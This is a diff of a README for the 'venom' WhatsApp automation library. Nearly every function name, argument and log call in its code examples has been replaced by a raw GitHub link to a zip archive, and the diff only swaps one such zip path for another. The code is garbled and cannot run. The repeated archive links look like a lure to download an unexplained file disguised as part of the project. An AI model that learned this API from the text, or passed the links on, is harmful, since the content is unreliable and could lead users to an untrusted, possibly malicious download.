-  .sendContactVcardList('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', [
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+  .sendContactVcardList('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', [
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
   ])
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Send basic text
 await client
-  .sendText('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', '👋 Hello from venom!')
+  .sendText('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', '👋 Hello from venom!')
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 
 // Send text message by injecting keystrokes into WhatsApp, thus maintaining the typing indicator
-let success = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', '👋 Hello from venom!');
+let success = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', '👋 Hello from venom!');
 
 // Send photo or video by injecting keystrokes
-let success = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'Pretty sunset');
+let success = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'Pretty sunset');
 
 // Send location
 await client
-  .sendLocation('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', '-13.6561589', '-69.7309264', 'Brasil')
+  .sendLocation('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', '-13.6561589', '-69.7309264', 'Brasil')
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Automatically sends a link with the auto generated link preview. You can also add a custom message to be added.
 await client
   .sendLinkPreview(
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
     'Kamakawiwo ole'
   )
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Send image (you can also upload an image using a valid HTTP protocol)
 await client
   .sendImage(
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
     'image-name',
     'Caption text'
   )
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 
 // Send image file base64
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', base64Image, "name file")
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', base64Image, "name file")
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Send file (venom will take care of mime types, just need the path)
 // you can also upload an image using a valid HTTP protocol
 await client
   .sendFile(
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
     'file_name',
     'See my file in pdf'
   )
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Sends file
 // base64 parameter should have mime type already defined
 await client
   .sendFileFromBase64(
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
     base64PDF,
-    'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+    'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
     'See my file in pdf'
   )
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Generates sticker from the provided animated gif image and sends it (Send image as animated sticker)
-// image path imageBase64 A valid gif and webp image is required. You can also send via http/https (https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)
+// image path imageBase64 A valid gif and webp image is required. You can also send via http/https (https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)
 await client
-  .sendImageAsStickerGif('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip')
+  .sendImageAsStickerGif('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip')
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Generates sticker from given image and sends it (Send Image As Sticker)
-// image path imageBase64 A valid png, jpg and webp image is required. You can also send via http/https (https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)
+// image path imageBase64 A valid png, jpg and webp image is required. You can also send via http/https (https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)
 await client
-  .sendImageAsSticker('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip')
+  .sendImageAsSticker('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip')
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Forwards messages
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(
-  'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
-  ['https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip','https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip']
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(
+  'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
+  ['https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip','https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip']
 ).then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
 })
 .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
 });
 
 // Send @tagged message
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(
-  'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(
+  'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
   'Hello @5218113130740 and @5218243160777!',
   ['5218113130740', '5218243160777']
 );
 
 // Reply to a message
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(
-  'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(
+  'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
   'This is a reply!',
-  'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip'
+  'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip'
 ).then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
 }).catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
 });
 
 // Send message with options
 await client.
         .sendMessageOptions(
-          'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+          'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
           'This is a reply!',
            {
               quotedMessageId: reply,
@@ -617,209 +617,209 @@ await client.
           resp = retorno;
         })
         .catch((e) => {
-          https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(e);
+          https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(e);
         });
 
 // Send gif
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(
-  'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
-  'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
-  'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(
+  'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
+  'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
+  'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
   'Gif image file'
 );
 
 //checks and returns whether a message and a reply
 // exemple:
-// await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(async (message) => {
-//     https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(message)); // replicated message
-//     https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip ); //customer message
+// await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(async (message) => {
+//     https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(message)); // replicated message
+//     https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip ); //customer message
 //   })
-checkReply = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(messagem);
+checkReply = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(messagem);
 
 // Send seen ✔️✔️
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Start typing...
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Set chat state (0: Typing, 1: Recording, 2: Paused)
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 0 | 1 | 2);
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 0 | 1 | 2);
 ```
 
 ## Retrieving Data
 
 ```javascript
 // Retrieve all chats
-const chats = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+const chats = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 //Retrieves all chats new messages
 const chatsAllNew = getAllChatsNewMsg();
 
 //Retrieves all chats Contacts
-const contacts = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+const contacts = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 //Retrieve all contacts new messages
-const contactNewMsg = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+const contactNewMsg = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Retrieve all groups
-// you can pass the group id optional use, exemple: https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip')
-const chats = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+// you can pass the group id optional use, exemple: https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip')
+const chats = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 //Retrieve all groups new messages
-const groupNewMsg = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+const groupNewMsg = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 //Retrieves all chats Transmission list
-const transmission = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+const transmission = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Retrieve contacts
-const contacts = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+const contacts = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Returns a list of mute and non-mute users
 // "all" List all mutes
 // "toMute" List all silent chats
 // "noMute" List all chats without silence
-const listMute = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('all');
+const listMute = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('all');
 
 // Calls your list of blocked contacts (returns an array)
-const getBlockList = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+const getBlockList = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Retrieve messages in chat
 //chatID chat id
 //includeMe will be by default true, if you do not want to pass false
 //includeNotifications will be by default true, if you do not want to pass false
-//const Messages = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(chatID, includeMe, includeNotifications)
-const Messages = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+//const Messages = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(chatID, includeMe, includeNotifications)
+const Messages = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Retrieve more chat message
-const moreMessages = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+const moreMessages = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Retrieve all messages in chat
-const allMessages = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(
-  'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip'
+const allMessages = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(
+  'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip'
 );
 
 // Retrieve contact status
-const status = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+const status = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Retrieve user profile
 // Please note that this function does not currently work due to a bug in WhatsApp itself.
 // There is no telling if or when this function might work again.
-const user = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+const user = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Retrieve all unread message
-const messages = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip();
+const messages = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip();
 
 // Retrieve profile fic (as url)
-const url = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+const url = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Retrieve chat/conversation
-const chat = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+const chat = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Check if the number exists
 const chat = await client
-  .checkNumberStatus('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip')
+  .checkNumberStatus('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip')
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 ```
 
 ## Group Functions
 
 ```javascript
-// groupId or chatId: leaveGroup https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip
+// groupId or chatId: leaveGroup https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip
 
 //change group description
 await client
-  .setGroupDescription('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'group description')
+  .setGroupDescription('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'group description')
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Leave group
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Get group members
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Get group members ids
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Generate group invite url link
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Create group (title, participants to add)
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Group name', [
-  'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
-  'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip'
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Group name', [
+  'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
+  'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip'
 ]);
 
 // Remove participant
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip');
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip');
 
 // Add participant
